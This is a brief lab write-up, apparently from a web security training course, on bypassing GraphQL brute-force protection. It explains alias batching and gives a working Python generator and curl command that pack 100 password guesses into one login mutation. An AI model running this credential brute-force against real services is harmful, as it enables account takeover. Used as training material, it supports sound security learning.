# Lab 4 — Bypassing GraphQL Brute Force Protections (PRACTITIONER)

## Vulnerability
Alias batching sends N login attempts in a single HTTP request, evading
per-request rate limiting.

## Quick Exploit
```python
# generate_brute.py
passwords = open("wordlist.txt").read().splitlines()[:100]
aliases = " ".join(
    f'p{i}:login(username:"carlos",password:"{p}"){{success token}}'
    for i, p in enumerate(passwords)
)
print(f'{{"query":"mutation{{{aliases}}}"}}')
```

```bash
python3 generate_brute.py | curl -s -X POST https://target/graphql \
  -H "Content-Type: application/json" -d @-
```
